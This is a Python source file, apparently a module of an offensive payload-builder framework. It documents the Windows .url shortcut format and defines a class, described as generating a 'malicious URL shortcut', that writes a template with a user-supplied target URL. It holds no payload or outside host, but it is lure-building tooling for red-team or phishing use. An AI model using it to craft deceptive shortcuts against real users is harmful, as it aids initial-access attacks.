#!/usr/bin/env python
# encoding: utf-8

import logging

from common.utils import getParamValue, MPParam
from modules.payload_builder import PayloadBuilder


"""

URL file format (from http://www.lyberty.com/encyc/articles/tech/dot_url_format_-_an_unofficial_guide.html)


URL
The URL field is self-explanatory. It’s the address location of the page to load.
It should be a fully qualifying URL with the format protocol://server/page. 
A URL file is not restricted to the HTTP protocol. In general, at least, whatever that can be saved as a favorite is a valid URL.

 
WorkingDirectory

It’s the “working folder” that your URL file uses. 
The working folder is possibly the folder to be set as the current folder for the application that would open the file. 
However Internet Explorer does not seem to be affected by this field.

Note: this setting does not seem to appear in some versions of Internet Explorer/Windows.

IconIndex
The Icon Index within the icon library specified by IconFile. In an icon library, which can be generally be either a ICO, DLL or EXE file, the icons are indexed with numbers. The first icon index starts at 0.

IconFile
Specifies the path of the icon library file. Generally the icon library can be an ICO, DLL or EXE file. The default icon library used tends to be the URL.DLL library on the system’s Windows\System directory

ShowCommand
(Nothing) - Normal
7         - Minimized
3         - Maximized

Note: this setting does not seem to appear in some versions of Internet Explorer/Windows.

"""


URL_TEMPLATE = \
r"""
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,2
[InternetShortcut]
IDList=
URL=<<<URL>>>

"""

# ShowCommand=7
# WorkingDirectory=C:\WINDOWS\
r"""
IconIndex=1
IconFile=C:\WINDOWS\SYSTEM32\url.dll
Hotkey=0
"""

class UrlShortcutGenerator(PayloadBuilder):
    """ Module used to generate malicious URL shortcut"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(f" [+] Generating {self.outputFileType} file...")
        paramArray = [MPParam("targetUrl")]
        self.fillInputParams(paramArray)

        # Fill template
        urlContent = URL_TEMPLATE
        urlContent = urlContent.replace("<<<URL>>>", getParamValue(paramArray, "targetUrl"))

        with open(self.outputFilePath, 'w') as f:
            f.writelines(urlContent)
        logging.info(f"   [-] Generated URL file: {self.outputFilePath}")
        logging.info("   [-] Test with : \n Click on %s file to test.\n" % self.outputFilePath)
        

        
        
        